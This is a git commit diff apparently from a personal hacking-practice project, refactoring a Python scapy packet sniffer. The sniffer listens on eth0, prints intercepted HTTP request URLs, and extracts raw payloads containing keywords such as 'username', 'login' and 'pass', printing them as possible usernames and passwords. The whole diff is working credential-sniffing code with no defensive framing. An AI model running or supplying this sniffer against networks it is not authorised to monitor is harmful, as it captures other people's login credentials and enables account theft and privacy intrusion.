d592e32f25a6a39a8de0484e38fd83c372cb1afd
razorboy73 <joshadamkerbel@gmail.com>
2024-06-29 18:57:50 -0400

    refactored code

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -6,30 +6,38 @@ from scapy.layers import http
 def main():
     sniff("eth0")
 
-def search_for_usernames(username):
-    keywords = ["username","uname", "user", "login", "pass"]
-    for keyword in keywords:
-        if keyword in str(username):
-            # you may get multiple keywords, so just return the username
-            return username.decode('utf-8')
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username","uname", "user", "login", "pass"]
+        for keyword in keywords:
+            if keyword in str(load):
+                # you may get multiple keywords, so just return the username
+                return load.decode('utf-8')
+
+def get_url(packet):
+    return f"[+]HTTP Request: {(packet[http.HTTPRequest].Host).decode('utf-8')}{(packet[http.HTTPRequest].Path).decode('utf-8')}"
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet.show())
+        # print(packet.show())
         # The b prefix in Python strings indicates that the string is a bytes object
         # rather than a regular string (which is typically Unicode).
         # This happens when you're dealing with binary data or byte-encoded strings,
         # often encountered when working with network protocols or reading files in binary mode.
         # To remove the b prefix and work with a regular string,
         # you can decode the bytes object into a string using the .decode() method.
-        print(f"{(packet[http.HTTPRequest].Host).decode('utf-8')}{(packet[http.HTTPRequest].Path).decode('utf-8')}")
+        url = get_url(packet)
+        print(f"[+] HTTP Request >> {url}")
         # password is in the raw layer
-        if packet.haslayer(scapy.Raw):
+        # if packet.haslayer(scapy.Raw):
+        login_info = get_login_info(packet)
+        if login_info:
             print("********************************************")
             # print(packet.show())
-            # print out the name of the layer and field we are interested in
-            load = packet[scapy.Raw].load
-            print(search_for_usernames(load))
+            # print out the name of the layer and field we are interested i
+            print(f"\n\n[+] - Possible usernames/passwords: {login_info}\n\n")
             print("********************************************")
     # if packet.haslayer(http.HTTPResponse):
     #     http_layer = packet[http.HTTPResponse]
